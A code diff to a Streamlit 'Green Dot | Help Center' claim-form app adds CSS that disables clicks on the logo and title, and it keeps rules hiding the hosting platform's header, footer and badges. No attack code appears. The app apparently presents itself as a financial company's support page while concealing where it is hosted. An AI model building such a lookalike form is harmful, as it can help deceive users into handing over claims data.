@@ -23,7 +23,7 @@ init_db()
 
 st.set_page_config(page_title="Green Dot | Help Center", layout="wide", page_icon="✅")
 
-# --- CSS NUCLEAR PARA OCULTAR BRANDING Y DESACTIVAR FULLSCREEN ---
+# --- CSS NUCLEAR ---
 st.markdown("""<style>
 header {visibility: hidden !important; height: 0px !important;}
 footer {display: none !important; visibility: hidden !important;}
@@ -33,7 +33,13 @@ footer {display: none !important; visibility: hidden !important;}
 [data-testid='stAppToolbar'] {display: none !important;}
 [data-testid='stFooterAd'] {display: none !important;}
 
-/* Ocultar botón de Fullscreen en imágenes */
+/* Desactivar click y puntero en logo y títulos para asegurar que no funcionen como links */
+[data-testid="stImage"], h1 {
+    pointer-events: none !important;
+    cursor: default !important;
+    text-decoration: none !important;
+}
+
 button[title='View fullscreen'] {display: none !important;}
 
 div[class*='viewerBadge'], div[class*='styles_viewerBadge'], [data-testid='stStatusWidget'] {
@@ -74,8 +80,10 @@ div[class*='viewerBadge'], div[class*='styles_viewerBadge'], [data-testid='stSta
 
 # --- UI CONTENT ---
 if os.path.exists('logo.svg'):
+    # Mostramos la imagen sin el parámetro output_format que a veces genera envoltorios de link
     st.image('logo.svg', width=150)
 
+# Título estático
 st.title("Help Center")
 st.write("Please fill out the form below to submit your claim.")
 
